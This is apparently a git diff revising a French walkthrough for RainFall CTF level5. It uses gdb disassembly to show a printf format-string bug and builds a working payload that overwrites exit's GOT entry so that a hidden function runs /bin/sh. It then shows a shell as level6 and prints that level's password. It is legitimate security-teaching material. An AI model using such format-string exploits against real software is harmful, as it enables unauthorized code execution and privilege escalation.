@@ -5,19 +5,19 @@
 /_/\___/|___/\___/_/_____/   
                              
 
-On lance le binaire et on se rend compte qu'il duplique ce que l'on écrit sur l'entrée standard. 
 
-level5@RainFall:~$ ./level5
-AAAA
-AAAA
 
-Again …
+>$  level5@RainFall:~$ ./level5
+    AAAA
+    AAAA
 
->$ (gdb) objdump -d level5 
+On lance le binaire et on se rend compte qu'il duplique ce que l'on écrit sur l'entrée standard. Again …
+
+>$  (gdb) objdump -d level5 
 
 On peut voir que le <main> fait appel à une fonction <n>. Il y'a aussi une fonction <o> laissé-pour-compte mais intéressante :
 
-______________________________________________________________________________________________________________________________________
+______________________________________________________________________________________________________________________________________________________________________
 								|
 (gdb) disas n							|	(gdb) disas o											
 Dump of assembler code for function n:				|	Dump of assembler code for function o:
@@ -30,7 +30,7 @@ Dump of assembler code for function n:				|	Dump of assembler code for function 
    0x080484dc <+26>:	lea    -0x208(%ebp),%eax		|		0x080484bd <+25>:	call   0x8048390 <_exit@plt>
    0x080484e2 <+32>:	mov    %eax,(%esp)			|	
    0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>            |	End of assembler dump.
-   0x080484ea <+40>:	lea    -0x208(%ebp),%eax		 \_____________________________________________________________________
+   0x080484ea <+40>:	lea    -0x208(%ebp),%eax		 \_____________________________________________________________________________________________________
    0x080484f0 <+46>:	mov    %eax,(%esp)		  	|
    0x080484f3 <+49>:	call   0x8048380 <printf@plt>		|
    0x080484f8 <+54>:	movl   $0x1,(%esp)			|                           
@@ -40,8 +40,8 @@ End of assembler dump.						|
 ________________________________________________________________|
 
 En ce qui concerne <n>, rien de nouveau comme précédemment les args pour la fonction fgets() sont push sur la stack. Notre input est 
-récuperé via fgets(), puis de nouveau notre input est push en argument mais pour printf(). Il nous ai donc renvoyé puis la fonciont exit. 
-Cette fois si il n'y a pas de cmp pour nous ouvrir les portes du level suivant ...
+récuperé via fgets(), puis de nouveau notre input est push en argument mais pour printf(). Notre input nous ai donc renvoyé puis la fonciont
+appele la fonction exit(). Cette fois si il n'y a pas de cmp pour nous ouvrir les portes du level suivant ...
 
 Cela dit il y a une fonction <o> non appellée, qui nous permettrait d'accéder à un shell si nous pouvions rediriger
 le flow d'execution vers elle car <o> fait appel à system() qui prends en argument "\bin\sh".
@@ -52,7 +52,7 @@ et la fonction de resolution de symbole.
 
 En effet on remarque une difference flagrante en effectuant un "$>disas exit" post-run et pré-run :
 
-_______________________________________________________________________________________________________________________________________
+____________________________________________________________________________________________________________________________________________________________________
 								|
 (gdb) run							|	(gdb) disas exit
 Starting program: /home/user/level5/level5			|	Dump of assembler code for function exit@plt:
@@ -60,7 +60,7 @@ Starting program: /home/user/level5/level5			|	Dump of assembler code for functi
 Breakpoint 1, 0x08048507 in main ()				|	   0x080483d6 <+6>:		push   $0x28
 (gdb) disas exit						|	   0x080483db <+11>:		jmp    0x8048370
 Dump of assembler code for function exit:			|	End of assembler dump.
-   0xb7e5ebe0 <+0>:	push   %ebx				 \______________________________________________________________________
+   0xb7e5ebe0 <+0>:	push   %ebx				 \__________________________________________________________________________________________________
    0xb7e5ebe1 <+1>:	call   0xb7f56c73			|
    0xb7e5ebe6 <+6>:	add    $0x17240e,%ebx			|	Pré-run la fonction exit() ne semble pas être chargée, ici le 1er
    0xb7e5ebec <+12>:	sub    $0x18,%esp			|	jmp se fait sur l'adresse CONTENUE dans 0x8049838. Il n'en faut 
@@ -86,17 +86,16 @@ En utilisant la même methode qu'aux level3 et level4 (cf):
 	
 On peut alors monter l'exploit suivante : 
 
-$>level5@RainFall:~$ python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit
+$>$ level5@RainFall:~$ (python -c 'print("\x38\x98\x04\x08" + "%134513824d%4$n")'; cat) | ./level5 | tr -d " "
+    whoami
+    level6
+    cat /home/user/level6/.pass
+    d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 
-$>level5@RainFall:~$ cat /tmp/exploit - | ./level5 | tr -d " "
-whoami
-level6
-cat /home/user/level6/.pass
-d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 
 Afin d'avoir plus de détail sur le chargement runtime des librairies je vous invite à visiter les liens suivant :
-https://www.segmentationfault.fr/linux/role-plt-got-ld-so/
-http://dustin.schultz.io/how-is-glibc-loaded-at-runtime.html
-https://www.youtube.com/watch?v=t1LH9D5cuK4
+- https://www.segmentationfault.fr/linux/role-plt-got-ld-so/
+- http://dustin.schultz.io/how-is-glibc-loaded-at-runtime.html
+- https://www.youtube.com/watch?v=t1LH9D5cuK4
 
 Next ...
